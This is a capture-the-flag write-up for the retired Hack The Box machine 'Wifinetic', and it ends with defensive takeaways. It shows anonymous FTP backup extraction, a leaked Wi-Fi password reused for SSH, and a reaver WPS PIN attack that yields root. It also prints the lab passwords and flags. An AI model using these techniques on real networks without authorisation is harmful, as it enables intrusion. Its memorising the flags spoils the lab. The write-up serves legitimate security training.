## Overview

- **Platform:** Hack The Box (retired)
- **Target OS:** OpenWrt / Embedded Linux (router-like device)
- **Focus:** anonymous FTP → backup extraction → credential reuse (SSH) → local wireless enumeration → WPS PIN attack (reaver) → root shell 
- **Difficulty:** Easy / Medium (requires local wireless tooling)

## Recon

Initial scan:
```bash
nmap -sV -sC -oN initial 10.129.229.90
```
![Nmap scan showing open services](/images/wifinetic/nmap.png)

Result highlights (relevant lines):

Anonymous FTP and the router backup archive (backup-OpenWrt-2023-07-26.tar) were the highest-value findings.

## FTP enumeration & archive extraction
Anonymous FTP allowed downloading files as the ftp user. I downloaded the backup archive and extracted it locally:

![FTP Anonymous login](/images/wifinetic/ftp_anonymous.png)

```ftp
get backup-OpenWrt-2023-07-26.tar
```
```bash
tar -xvf backup-OpenWrt-2023-07-26.tar
```
![Download tar file and then unzip](/images/wifinetic/get-tar-file.png)

**Inside the extracted filesystem I inspected OpenWrt config files and discovered a Wi-Fi passphrase in plaintext:**

![Inspected OpenWrt config files](/images/wifinetic/config_files.png)

"VeRyUniUqWiFIPasswrd1!"

![Found wifi password](/images/wifinetic/found_password.png)


I also noted local account names recorded in the extracted /etc/passwd.

![Inspected OpenWrt config files](/images/wifinetic/config_files.png)

---

## Initial access — credential reuse → SSH (netadmin)

I tried reusing the discovered Wi-Fi password against local accounts from /etc/passwd and successfully logged in as netadmin:

```bash
ssh netadmin@10.129.229.90
password: VeRyUniUqWiFIPasswrd1!
```
![SSH login as netadmin](/images/wifinetic/ssh_netadmin.png)


**User flag:**

```bash
netadmin@wifinetic:~$ cat user.txt
```

"03687ad349ad3fd2ab27afb86bc10f1b"

![User flag found](/images/wifinetic/user_flag.png)


---

## Local enumeration — wireless roles & capabilities

With a user shell, the next step is privilege escalation.

From the netadmin shell I enumerated network and wireless services:

```bash
ifconfig
```
![Local enumeration](/images/wifinetic/ifconfig.png)


```bash
systemctl status wpa_supplicant.service
```
![Local enumeration](/images/wifinetic/wpa-supplicant.png)


```bash
systemctl status hostapd.service
```
![Local enumeration - hostapd](/images/wifinetic/hostapd.png)

I used iwconfig, the wireless-specific counterpart to ifconfig, to inspect the radio interfaces:

```bash
iwconfig
```
![Local enumeration - iwconfig](/images/wifinetic/iwconfig.png)


```bash
iw dev
```
![Local wireless enumeration - iw dev](/images/wifinetic/iw-dev.png)

`iw dev` lists the wireless interfaces and their capabilities.

---

## Findings:

- wlan1 was a managed client (connected to ESSID: "OpenWrt").

- wlan0 was in Master mode (the device acting as the AP).

- mon0 (monitor mode) was present on the device.


**I also checked file capabilities:**
```bash
getcap -r / 2>/dev/null
```
![Checked file capabilities with getcap](/images/wifinetic/getcap.png)

```text
/usr/bin/reaver = cap_net_raw+ep
```

/usr/bin/reaver had cap_net_raw, meaning it could perform raw network operations needed for WPS attacks.

---

## Privilege Escalation — WPS PIN attack (reaver)

**From iw / iwconfig output I identified the AP BSSID:**

"02:00:00:00:00:00"

I launched a WPS PIN attack from the device (using the local reaver binary) on the monitor interface:

```bash
reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1
```
![WPS PIN attack using reaver](/images/wifinetic/reaver.png)


**Reaver completed and returned the AP Wi-Fi passphrase:**

"WhatIsRealAnDWhAtIsNot51121!"

Using that passphrase I switched to root:

```bash
netadmin@wifinetic:~$ su root
Password: WhatIsRealAnDWhAtIsNot51121!
```
![Root access](/images/wifinetic/su_root.png)

**Root flag:**

```bash
root@wifinetic:/home/netadmin# cat /root/root.txt
```
![Root flag](/images/wifinetic/root_flag.png)

"94866ea86e569ab12e3c2d0f5893db19"

## Flags

User flag: 03687ad349ad3fd2ab27afb86bc10f1b

Root flag: 94866ea86e569ab12e3c2d0f5893db19

## Takeaways

- Backups leak secrets. Firmware/backups (OpenWrt configs) contained a Wi-Fi passphrase — treat backups as sensitive.

- Credential reuse works. The Wi-Fi password reused on a local account provided the initial foothold.

- Local tooling matters. getcap revealed reaver with cap_net_raw—check file capabilities during enumeration.

- WPS is risky. If WPS is enabled, Reaver-style PIN attacks can reveal strong credentials; disable WPS where possible.

- Defensive steps: restrict anonymous FTP, avoid storing plaintext credentials in backups, disable WPS on APs, and remove unnecessary cap_net_raw capabilities from binaries.
